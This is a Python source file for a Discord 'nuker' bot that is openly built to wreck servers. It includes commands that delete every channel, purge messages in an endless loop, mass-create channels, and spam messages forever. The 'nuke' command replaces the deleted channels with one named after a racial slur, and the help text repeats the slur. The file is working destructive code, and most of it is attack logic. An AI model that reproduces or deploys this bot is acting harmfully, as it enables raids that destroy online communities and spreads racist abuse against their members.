from discord.ext import commands
from os import system,name
if name == 'nt':
    system('cls')
else:
    system('clear')

__me__ = "LiBeRtY - https://github.com/PewFam/"

header = """

    ____             _      _   __      __            
   / __ )____ ______(_)____/ | / /_  __/ /_____  _____
  / __  / __ `/ ___/ / ___/  |/ / / / / //_/ _ \/ ___/
 / /_/ / /_/ (__  ) / /__/ /|  / /_/ / ,< /  __/ /    
/_____/\__,_/____/_/\___/_/ |_/\__,_/_/|_|\___/_/     
                                                      
"""
print(header)

bot = commands.Bot(
	command_prefix="#",  # Whatever u want
	case_insensitive=True  
)
bot.remove_command("help")
bot.author_id = 123456789876543219



@bot.event
async def on_ready():
    print(f"Bot: {bot.user}")
    print(f"Original prefix : # ")
    print(f"Commands: do \033[4m\033[1m#help\033[0m\033[0m in a channel")

@bot.command()
async def help(ctx):
  await ctx.send("~Bot~")
  await ctx.send("_**Default Prefix: # **_")
  await ctx.send("~1~ **clear** - clears da channel")
  await ctx.send(r'~2~ _**nuke**_ - nukes the server and adds a new channel "#nigger ?"')
  await ctx.send("~3~ **special** - nukes the server and adds a new channel 'whateveryouwant' = ex: #special ligma+balls")
  await ctx.send("~4~ **spam** - spams messages = example: #spam huh_?")
  await ctx.send("~6~ **spamchannel** - spams channels = ex: #spamchannel omg 10")
  await ctx.send("~7~ **vocal** - create a vocal channel ex: #vocal hey 1")
  await ctx.send("~8~ **auto** - nukes & makes a simple server model")
  await ctx.send("**Spaces are __+__**")

  
@bot.command()
async def clear(ctx):
  while 1:
    await ctx.channel.purge(limit=1000)
@bot.command()
async def nuke(ctx):
  guild = ctx.guild
  for channel in guild.channels:
    try:
      await channel.delete()
    except:pass
  for i in range(1):
    await guild.create_text_channel('nigger-?')
@bot.command()
async def spamchannel(ctx, spam1, amount):
  guild = ctx.guild
  for i in range(int(amount)):await guild.create_text_channel(str(spam1.replace("+", " ")))

@bot.command()
async def special(ctx,channeladd):
  for c in ctx.guild.channels:
    await c.delete()
  await ctx.guild.create_text_channel(channeladd.replace("+"," "))
@bot.command()
async def spam(ctx, spamtext):
  while 1:await ctx.send(str(spamtext).replace("+"," "))
@bot.command()
async def vocal(ctx,voice,amount):
  guild = ctx.guild
  for i in range(int(amount)):
      await guild.create_voice_channel('voc')
@bot.command()
async def auto(ctx):
    try:
        guild = ctx.guild
        for channel in guild.channels:
          try:
            await channel.delete()
          except:pass
        guild = bot.get_guild() # <-- insert yor guild id here
        
        category = await guild.create_category("Terminal", overwrites=None, reason=None)
        await guild.create_text_channel('welcome+!', overwrites=None, category=category, reason=None)
        await guild.create_text_channel('goodbye+!', overwrites=None, category=category, reason=None)
        category2 = await guild.create_category("Talk", overwrites=None, reason=None)
        await guild.create_text_channel('chat+!', overwrites=None, category=category2, reason=None)
        await guild.create_text_channel('medias+!', overwrites=None, category=category2, reason=None)
        await guild.create_text_channel('memes+!', overwrites=None, category=category2, reason=None)
        category3 = await guild.create_category("Play/ Laugh" , overwrites=None, reason=None)
        await guild.create_voice_channel('vocal 1 !', overwrites=None, category=category3, reason=None)
        await guild.create_voice_channel('vocal 2 !', overwrites=None, category=category3, reason=None)
        await ctx.send("Setup finished!")
    except Exception as errors:
        print(f"Bot Error: {errors}")
token = "" 
bot.run(token)  # Starts the bot
